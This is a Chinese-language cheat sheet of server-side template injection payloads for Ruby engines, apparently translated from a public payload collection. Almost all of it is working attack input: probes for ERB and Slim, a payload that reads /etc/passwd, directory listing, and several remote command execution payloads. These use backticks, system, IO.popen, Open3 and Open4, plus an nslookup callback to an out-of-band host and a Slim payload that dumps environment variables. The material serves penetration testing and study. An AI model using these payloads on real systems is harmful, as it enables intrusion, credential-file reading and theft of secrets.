# 服务器端模板注入 - Ruby

> 服务器端模板注入（SSTI）是一种漏洞，当攻击者能够将恶意代码注入到服务器端模板中时，服务器就会执行任意命令。在 Ruby 中，SSTI 可能发生在使用像 ERB（嵌入式 Ruby）、Haml、Liquid 或 Slim 这样的模板引擎时，尤其是当用户输入被直接插入到模板中而没有进行适当的清理或验证时。

## 概述

- [模板库](#模板库)
- [Ruby](#ruby)
    - [Ruby - 基本注入](#ruby---基本注入)
    - [Ruby - 获取/etc/passwd](#ruby---获取etcpasswd)
    - [Ruby - 列出文件和目录](#ruby---列出文件和目录)
    - [Ruby - 远程命令执行](#ruby---远程命令执行)
- [参考文献](#参考文献)

## 模板库

| 模板名称 | 负载格式 |
| ---------- | -------- |
| Erb       | `<%= %>` |
| Erubi     | `<%= %>` |
| Erubis    | `<%= %>` |
| HAML      | `#{ }`   |
| Liquid    | `{{ }}`  |
| Mustache  | `{{ }}`  |
| Slim      | `#{ }`   |

## Ruby

### Ruby - 基本注入

**ERB**:

```ruby
<%= 7 * 7 %>
```

**Slim**:

```ruby
#{ 7 * 7 }
```

### Ruby - 获取 /etc/passwd

```ruby
<%= File.open('/etc/passwd').read %>
```

### Ruby - 列出文件和目录

```ruby
<%= Dir.entries('/') %>
```

### Ruby - 远程命令执行

使用 SSTI 执行代码（适用于 **Erb**、**Erubi**、**Erubis** 引擎）。

```ruby
<%=(`nslookup oastify.com`)%>
<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

使用 SSTI 执行代码（适用于 **Slim** 引擎）。

```powershell
#{ %x|env| }
```

## 参考文献

- [Ruby ERB 模板注入 - Scott White & Geoff Walton - 2017 年 9 月 13 日](https://web.archive.org/web/20181119170413/https://www.trustedsec.com/2017/09/rubyerb-template-injection/)